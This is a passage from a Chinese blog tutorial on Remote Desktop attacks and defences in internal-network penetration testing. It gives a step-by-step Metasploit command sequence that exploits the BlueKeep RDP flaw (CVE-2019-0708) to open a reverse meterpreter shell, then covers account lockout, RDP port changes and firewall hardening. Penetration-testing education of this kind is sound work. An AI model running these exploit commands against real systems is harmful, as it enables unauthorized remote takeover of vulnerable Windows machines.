2017 年 WannaCry 恶意软件的传播方式类似。

它影响了某些旧版本的 Windows 系统，包括：

> Windows 7 foR 32-bit Systems Service Pack 1
>
> Windows 7 for x64-based Systems Service Pack 1
>
> Windows Server 2008 foR 32-bit Systems Service Pack 2
>
> Windows Server 2008 foR 32-bit Systems Service Pack 2 (Server Core
> installation)
>
> Windows Server 2008 for Itanium-Based Systems Service Pack 2
>
> Windows Server 2008 for x64-based Systems Service Pack 2
>
> Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core
> installation)
>
> Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
>
> Windows Server 2008 R2 for x64-based Systems Service Pack 1
>
> Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
> installation)
>
> Windows XP SP3 x86
>
> Windows XP Professional x64 Edition SP2
>
> Windows XP Embedded SP3 x86
>
> Windows Server 2003 SP2 x86
>
> Windows Server 2003 x64 Edition SP2

Windows 8 和 Windows 10 及之后版本的用户不受此漏洞的影响。

在 Metasploit 中已经有了该漏洞的利用模块：

![image-20210524123250919](https://image.3001.net/images/20210603/1622727859_60b8dcb311b9d106a9300.png!small)

第一个模块用来检测目标机是否存在漏洞，第二个模块用来进行攻击。设置好参数直接利用即可：

    
    
    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce  
    set payload windows/x64/meterpreter/reverse_tcp  
    set rhosts 192.168.93.20  
    set lhost 192.168.93.128  
    set rdp_client_ip 192.168.93.20  
    unset RDP_CLIENT_NAM  
    set target 2    # 这里的 2 代表目标机为虚拟机环境  
    exploit

如下图所示，攻击成功并得到了 meterpreter：

![image-20210524123839556](https://image.3001.net/images/20210603/1622727860_60b8dcb476fc042c7b62e.png!small)

## 如何防御你的 RDP

### 添加安全策略以防止暴力破解

管理员可以使用帐户锁定策略保护其网络免受暴力破解攻击，具体有以下相关策略：

>  **帐户锁定持续时间：**
> 用于定义锁定帐户保持时间段的策略，直到自动解锁或由管理员重置。当用户超过帐户锁定阈值设置的登录尝试时，它将锁定帐户指定的时间。
>
>  **帐户锁定阈值：** 定义失败登录尝试次数的策略，将在帐户锁定持续时间指定的某段时间内锁定帐户。它将允许最大数量指定尝试登录您的帐户。
>
>  **被锁账户锁定计数器：** 用于定义登录尝试失败后必须经过的时间段的策略。重置时间必须小于或等于帐户锁定时间。

### 端口修改

可以在另一个端口上转发端口 3389 以提高系统的安全性。我们可以导航到下面的注册表子项进行修改：

    
    
    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp

单击 “编辑”>“修改” ，然后单击“十进制”并键入新端口号，单击“确定” 后重新启动计算机即可生效。

也可以运行以下 PowerShell 命令来更改 RDP 端口，在此命令中，我们会将新的 RDP 端口指定为 3390：

    
    
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 3390  
    New-NetFirewallRule -DisplayName 'RDPPORTLatest' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3390

### 通过系统自带防火墙保护 RDP

我们可以打开具有高级设置的防火墙的面板，设定远程桌面的 TCP-In 相关配置从而添加安全过滤器。

## 未完待续

![20210523214959.jpg](https://image.3001.net/images/20210603/1622727863_60b8dcb7a654578012d3b.jpg!small)

本节中，我们初步汇总了一下远程桌面在内网渗透中的各种利用姿势。在下一节，我们将继续深入探究远程桌面在内网后渗透中的相关利用。

文中若有不当之处还请各位大佬多多点评

我的博客：<https://whoamianony.top/>

> 参考：
>
> <https://xz.aliyun.com/t/8574>
>
> <https://xz.aliyun.com/t/1987#toc-4>
>
> <http://www.91ri.org/14342.html>
>
> <https://www.cnblogs.com/backlion/p/9429738.html>
>
> <https://xz.aliyun.com/t/7034>
>
> [《内网渗透 |
> 后渗透之远程桌面》](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652873822&idx=1&sn=e83c66d345e6f5fd2422a494425b960d&chksm=bd59d8938a2e5185859885d8aa509c3702076b9959c4e9b08b26bf95fe2cac6fb9325200bb32&mpshare=1&scene=23&srcid=0429zoc2kiletxFCqNYZ4ovC&sharer_sharetime=1619691442815&sharer_shareid=fb28a23f5efa30b40dcc9905f48f84bf#rd)
>
> <https://www.mdsec.co.uk/2017/06/rdpinception/>

